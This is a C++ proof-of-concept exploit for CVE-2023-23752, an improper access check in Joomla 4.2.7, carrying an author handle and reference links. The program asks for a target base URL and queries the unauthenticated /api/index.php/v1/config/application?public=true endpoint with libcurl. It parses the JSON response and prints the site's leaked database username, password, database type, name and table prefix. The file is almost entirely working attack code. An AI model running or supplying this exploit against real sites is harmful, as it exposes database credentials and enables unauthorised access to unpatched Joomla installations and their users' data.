//  Author: Mil4ne 
//  Tested on: Joomla! Version 4.2.7
//  CVE : CVE-2023-23752

//  References:
//   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
//   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
//   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
//   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
//   - https://vulncheck.com/blog/joomla-for-rce
//   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

#include <iostream>
#include <string>
#include <curl/curl.h>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

size_t callback(const char* in, size_t size, size_t num, std::string* out) {
    const size_t totalBytes(size * num);
    out->append(in, totalBytes);
    return totalBytes;
}

int main() {
    std::string baseURL;
    std::cout << "Enter the base URL: ";
    std::getline(std::cin, baseURL); 
    
    std::string fullURL = baseURL + "/api/index.php/v1/config/application?public=true";

    CURL* curl = curl_easy_init();
    std::string response;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, fullURL.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_FAILONERROR, true);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            try {
                json j = json::parse(response);
                if (j.contains("data")) {
                    for (const auto& item : j["data"]) {
                        if (item.contains("attributes")) {
                            auto attrs = item["attributes"];
                            
                            if (attrs.contains("user")) {
                                std::cout << "User: " << attrs["user"] << std::endl;
                            }
                            if (attrs.contains("password")) {
                                std::cout << "Password: " << attrs["password"] << std::endl;
                            }
                            if (attrs.contains("dbtype")) {
                                std::cout << "DB Type: " << attrs["dbtype"] << std::endl;
                            }
                            if (attrs.contains("db")) {
                                std::cout << "DB Name: " << attrs["db"] << std::endl;
                            }
                            if (attrs.contains("dbprefix")) {
                                std::cout << "DB Prefix: " << attrs["dbprefix"] << std::endl;
                            }
                        }
                    }
                }
            } catch (json::parse_error& e) {
                std::cerr << "JSON parse error: " << e.what() << std::endl;
            }
        } else {
            std::cerr << "CURL Error: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    } else {
        std::cerr << "Failed to initialize CURL." << std::endl;
    }
    return 0;
}
